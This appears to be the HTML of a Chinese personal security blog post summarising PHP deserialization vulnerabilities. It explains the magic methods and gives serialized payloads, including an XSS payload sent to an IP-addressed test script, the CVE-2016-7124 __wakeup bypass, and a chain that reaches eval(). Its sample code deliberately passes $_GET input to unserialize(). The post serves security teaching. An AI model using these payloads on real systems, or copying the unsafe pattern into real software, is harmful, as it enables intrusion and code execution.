@@ -1,0 +1,427 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="PHP反序列化漏洞总结" />
+
+
+<meta name="description" content="今天总结一下PHP反序列化漏洞。
+原理序列化：对象转成能被存储的数据，反序列则是将数据重新转变成对象。转换的内容是类中的属性，不包括方法。攻击者可根据类新建一个对象再将该对象序列化成数据，然后将..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    PHP反序列化漏洞总结 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="PHP反序列化漏洞总结">
+            
+            PHP反序列化漏洞总结
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="tag">PHP反序列化漏洞总结</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/07/17</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天总结一下PHP反序列化漏洞。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>序列化：对象转成能被存储的数据，反序列则是将数据重新转变成对象。转换的内容是类中的属性，不包括方法。攻击者可根据类新建一个对象再将该对象序列化成数据，然后将这些数据传入，进行反序列化。这个过程本没有漏洞，但是在序列化或者反序列化时会触发一些魔术方法，而这些方法中又使用了echo, eval等危险函数，使得传进来的数据被执行从而造成危害。</p>
+<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>序列化函数：serialize();    反序列化函数：unserialize();</p>
+<p>魔术方法：</p>
+<ul>
+<li>__construct(); 构造函数，在创建对象时被触发。</li>
+<li>__destruct();  析构函数，在销毁对象时触发。</li>
+<li>__toString();  在将对象转换成字符串时触发。</li>
+<li>__sleep();   在序列化前触发。</li>
+<li>__wakeup();   在反序列化后触发。</li>
+<li>__get();   在读取不可访问的属性值时触发。</li>
+<li>__call();   在调用未定义的方法时触发。</li>
+</ul>
+<h2 id="序列化与反序列化过程"><a href="#序列化与反序列化过程" class="headerlink" title="序列化与反序列化过程"></a>序列化与反序列化过程</h2><ul>
+<li><p>序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">         public $a &#x3D; &#39;ThisA&#39;;</span><br><span class="line">         protected $b &#x3D; &#39;ThisB&#39;;</span><br><span class="line">         private $c &#x3D; &#39;ThisC&#39;;</span><br><span class="line">         public function test1()&#123;</span><br><span class="line">                  return&#39;this is test1 &#39;;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test &#x3D; new Test();</span><br><span class="line">var_dump(serialize($test));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建对象后，使用serialize序列化该对象，然后使用var_dump输出结果，得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(84) &quot;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>前面的string(84)忽略。观察结果。O代表对象，4是对象名称的长度，test即对象名（类名）。3表示该对象有3个属性。{}里就是属性。以分号隔开键值对。在属性与属性值前都有：s:x。表示长度。注意<em>号。重点解释：*</em>属性有三种类型，public, protect, private。**</p>
+<ul>
+<li>public。公有属性。序列化后的属性直接就是本身。如上面的”a”。</li>
+<li>protect。保护属性。序列化后的属性是：<code>%00*%00属性名</code>。如上面的：”*b”。%00代表NULL，由于编码原因没显示出来。</li>
+<li>private。私有属性。序列化后的属性是：<code>%00类名%00属性名</code>。如上面的：“Testc”。</li>
+</ul>
+</li>
+<li><p>反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data &#x3D; $_GET[&#39;data&#39;];</span><br><span class="line">	var_dump(unserialize($data));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接收传进来的数据，注意%00。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.88.139&#x2F;unserialize.php?data&#x3D;O:4:%22Test%22:3:&#123;s:1:%22a%22;s:5:%22ThisA%22;s:4:%22%00*%00b%22;s:5:%22ThisB%22;s:7:%22%00Test%00c%22;s:5:%22ThisC%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其反序列化后输出得到结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(__PHP_Incomplete_Class)#1 (4) &#123; [&quot;__PHP_Incomplete_Class_Name&quot;]&#x3D;&gt; string(4) &quot;Test&quot; [&quot;a&quot;]&#x3D;&gt; string(5) &quot;ThisA&quot; [&quot;b&quot;:protected]&#x3D;&gt; string(5) &quot;ThisB&quot; [&quot;c&quot;:&quot;Test&quot;:private]&#x3D;&gt; string(5) &quot;ThisC&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="利用反序列化进行xss"><a href="#利用反序列化进行xss" class="headerlink" title="利用反序列化进行xss"></a>利用反序列化进行xss</h2><p>将属性值改成：<code>svg/onload=alert(1)</code>。（如果直接加&lt;&gt;，会执行payload得不到结果）进行序列化，然后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:19:&quot;svg&#x2F;onload&#x3D;alert(1)&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后加上&lt;&gt;，注意长度变了，19改成21。还有注意后面加上%00。最后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.178.88.139&#x2F;unserialize.php?data&#x3D;O:4:%22Test%22:3:&#123;s:1:%22a%22;s:21:%22%3Csvg&#x2F;onload&#x3D;alert(1)%3E%22;s:4:%22%00*%00b%22;s:5:%22ThisB%22;s:7:%22%00Testc%00%22;s:5:%22ThisC%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过-wakeup-函数"><a href="#绕过-wakeup-函数" class="headerlink" title="绕过__wakeup()函数"></a>绕过__wakeup()函数</h2><p>__wakeup()是在反序列化后执行的，但还有更后面执行的destruct()。如果限定死了wakeup，就无法将payload直接传入执行到后面的destruct。因此需要绕过wakeup，不让它执行。（CVE-2016-7124）</p>
+<p><strong>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会绕过</strong>。即：</p>
+<p>原本的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>属性有3个，就显示为：”Test”:3: 。如果改成大于3的数字，如4：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:4:&#123;s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即可绕过。</p>
+<h2 id="同名方法的利用"><a href="#同名方法的利用" class="headerlink" title="同名方法的利用"></a>同名方法的利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class A&#123;</span><br><span class="line">        public $target;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;target &#x3D; new B;</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            $this-&gt;target-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class B&#123;</span><br><span class="line">        function action()&#123;</span><br><span class="line">            echo &quot;action B&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class C&#123;</span><br><span class="line">        public $test;</span><br><span class="line">        function action()&#123;</span><br><span class="line">            echo &quot;action A&quot;;</span><br><span class="line">            eval($this-&gt;test);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unserialize($_GET[&#39;test&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有三个类，类A调用一个函数action。但是类B和类C中都有action函数。类B的action函数没什么用，类C的action函数却有eval函数。因此需要让类A调用C的action函数。那么可以创建一个文件，内容是类A和类C，然后创建A对象再序列化即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class A&#123;</span><br><span class="line">        public $target;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;target &#x3D; new C;</span><br><span class="line">            $this-&gt;target-&gt;test &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            $this-&gt;target-&gt;action();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class C&#123;</span><br><span class="line">        public $test;</span><br><span class="line">        function action()&#123;</span><br><span class="line">            echo &quot;action C&quot;;</span><br><span class="line">            eval($this-&gt;test);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo serialize(new A);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHPsession-和-phar"><a href="#PHPsession-和-phar" class="headerlink" title="PHPsession 和 phar"></a>PHPsession 和 phar</h2><p>看：<a href="https://xz.aliyun.com/t/6753#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/6753#toc-13</a></p>
+<p>或：<a href="https://www.cnblogs.com/ichunqiu/p/10484832.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/10484832.html</a></p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://www.freebuf.com/articles/web/209975.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/209975.html</a></p>
+<p><a href="https://www.freebuf.com/column/202607.html" target="_blank" rel="noopener">https://www.freebuf.com/column/202607.html</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/07/18/Host%E5%A4%B4%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" class="pre-post btn btn-default" title='Host头攻击总结'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            Host头攻击总结</span>
+    </a>
+    
+    
+    <a href="/2020/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="next-post btn btn-default" title='命令执行漏洞总结'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            命令执行漏洞总结</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关函数"><span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化与反序列化过程"><span class="toc-text">序列化与反序列化过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用反序列化进行xss"><span class="toc-text">利用反序列化进行xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过-wakeup-函数"><span class="toc-text">绕过__wakeup()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同名方法的利用"><span class="toc-text">同名方法的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHPsession-和-phar"><span class="toc-text">PHPsession 和 phar</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
